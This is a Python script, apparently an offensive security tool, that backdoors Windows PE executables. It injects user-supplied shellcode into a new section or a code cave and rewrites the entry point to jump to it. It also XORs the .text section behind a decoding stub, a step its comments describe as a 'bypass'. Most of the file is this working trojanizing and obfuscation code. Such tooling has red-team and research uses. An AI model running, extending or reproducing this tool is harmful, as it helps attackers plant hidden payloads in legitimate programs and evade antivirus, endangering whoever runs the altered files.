#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add function to resume execution (not really working at the moment)
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
import sys
import random
import string
import struct
import os
# Required
try: # Kind of check to ensure all modules are installed
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Import custom modules/functions
from f_generic import *
from f_pe import *

#####################################################
# Functions
#####################################################

### Add shellcode to binary (either into new section or code cave)
def main_inject_shellcode(pe_struct, shellcode, section_name = None, output_file = None, code_cave=False, verbose = False):
    # Get shellcode content
    shellcode, shellcode_size = open_shellcode_file(shellcode)

    if not code_cave:
        print "\n[*] Adding shellcode into new section (technique 1)"
        # Generate a new section name (if not given by user)
        new_section_name = gen_section_name(section_name)
        # Create a new section
        pe_struct, new_section = create_new_section(pe_struct, sectionName=new_section_name)
        # Verbose
        if (args.verbose):
            iterate_trough_pe_sections(pe_struct)

        offset_address = new_section.VirtualAddress

    else: # Add new section
        print "\n[*] Adding shellcode into code cave (technique 2)"
        # Look for code_cave big enough for shellcode
        result_code_cave = find_code_cave(pe_struct, shellcode_size)
        if len(result_code_cave) == 0:
            print "[!] Can't find a code cave where your shellcode may fit (try with technique 1 or use a shorter shellcode).\nExiting..."
            sys.exit(1)
        else:
            # Let user decide which code cave to use
            code_cave_index = user_choice_int("\nWhich code cave do you want to use? ", "[!] Enter valid index please", len(result_code_cave))
            offset_address, section_name = result_code_cave[code_cave_index]
            # Check if section is executable
            if "x" not in get_section_flags(pe_struct, section_name):
                change_section_flags(pe_struct, section_name)

    # Injecting shellcode (new section)
    inject_shellcode(pe_struct, shellcode, offset_address)
    # Update entry point, to jump to our shellcode
    update_entry_point_jmp_to_shellcode(pe_struct, offset_address)
    # Write PE file
    write_PE_file(pe_struct, output_file)

### XOR a section to "bypass"
def main_xor(pe_struct, add_prologue=False, section_name = None, output_file = None, verbose = False):
    # 1 - Find prologue (few ASM instructions)
    prologue, prologue_offset = figure_prologue(pe_struct, verbose)

    # 2 - XOR corresponding section
    xor_section(pe_struct, ".text")

    # 3 - Create new section
    # Generate a new section name (if not given by user)
    new_section_name = gen_section_name(section_name)
    # Create a new section
    pe_struct, latest_section = create_new_section(pe_struct, sectionName=new_section_name)
    # Verbose
    if (verbose):
        iterate_trough_pe_sections(pe_struct)

    # Find size (and index) of a specific section
    section, index = find_section(pe_struct, section_name = ".text")
    diff_end_section = (section.VirtualAddress + section.SizeOfRawData) - (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # 3 - Create XOR routine
    xor_routine = xor_routine_asm(diff_end_section)

    # 4 - Need to adjust for prologue
    if prologue == None:
        print "[!] Can't figure out prologue, the program might crash at run time"
    else:
        if prologue_offset != -1:
            current_addr = latest_section.VirtualAddress + len(xor_routine)
            jmp_to = pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + prologue_offset

            diff_jmp = jmp_to-current_addr - (len(prologue)/2) # since we add prologue
            xor_routine += "\xe8" + p(diff_jmp)
        else:
            pass
            #xor_routine += prologue.decode("hex")

    # add RET instruction to XOR routine
    xor_routine += "\xc3" # RET

    # Change code @ entry point
    update_entry_point_jmp_to_shellcode(pe_struct, latest_section.VirtualAddress, inst=b"\xE8")
    # Update code to add XOR routine
    inject_shellcode(pe_struct, xor_routine, latest_section.VirtualAddress)
    # Make section writable
    section.Characteristics = 0xE00000E0
    # Write PE file
    write_PE_file(pe_struct, output_file)

#####################################################
# Main
#####################################################
if __name__ == "__main__":
    args = parser()

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)
    pe_quick_analysis(pe_struct)

    if (args.analyse): # Look for code cave
        pe_deeper_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.hide):
        pass
    elif (args.shellcode):
        main_inject_shellcode(pe_struct, args.shellcode, args.new_sec_name, args.output, args.sh_cc, args.verbose)
    elif (args.test):
        main_xor(pe_struct, "", args.new_sec_name, args.output, args.verbose)

    print "\n[*] Finished.\nExiting..."
